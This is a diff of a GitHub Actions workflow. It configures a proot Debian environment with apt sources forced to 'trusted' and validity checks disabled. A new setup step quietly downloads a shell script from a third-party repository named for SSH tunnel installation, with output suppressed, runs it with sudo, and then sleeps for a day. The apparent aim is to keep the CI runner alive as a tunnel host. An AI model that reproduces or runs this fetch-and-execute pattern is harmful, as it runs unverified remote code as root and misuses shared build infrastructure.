@@ -17,7 +17,12 @@ jobs:
      
       - name: setup
         run: |
-           cd /test && ./dist/proot -S . /bin/bash -c "printf 'deb [trusted=yes] http://archive.debian.org/debian buster main contrib non-free\ndeb-src [trusted=yes] http://archive.debian.org/debian buster main contrib non-free\ndeb [trusted=yes] http://archive.debian.org/debian-security buster/updates main contrib non-free\n' | tee /etc/apt/sources.list > /dev/null && echo 'Acquire::Check-Valid-Until \"false\";' | tee /etc/apt/apt.conf.d/99no-check-valid-until > /dev/null && apt -o Acquire::Check-Valid-Until=false update" &&   printf " apt install httping wget -y \n sudo  wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run " | sudo ./dist/proot -S . /bin/bash && printf "httping -l google.com" | sudo ./dist/proot -S . /bin/bash
-       
+           cd /test && ./dist/proot -S . /bin/bash -c "printf 'deb [trusted=yes] http://archive.debian.org/debian buster main contrib non-free\ndeb-src [trusted=yes] http://archive.debian.org/debian buster main contrib non-free\ndeb [trusted=yes] http://archive.debian.org/debian-security buster/updates main contrib non-free\n' | tee /etc/apt/sources.list > /dev/null && echo 'Acquire::Check-Valid-Until \"false\";' | tee /etc/apt/apt.conf.d/99no-check-valid-until > /dev/null && apt -o Acquire::Check-Valid-Until=false update" 
+           
+      - name: setup
+        run: |
+           cd /test && mkdir test && wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run
+        
+ 
       - name: Ubuntu ready to go 
         run: sleep 1d
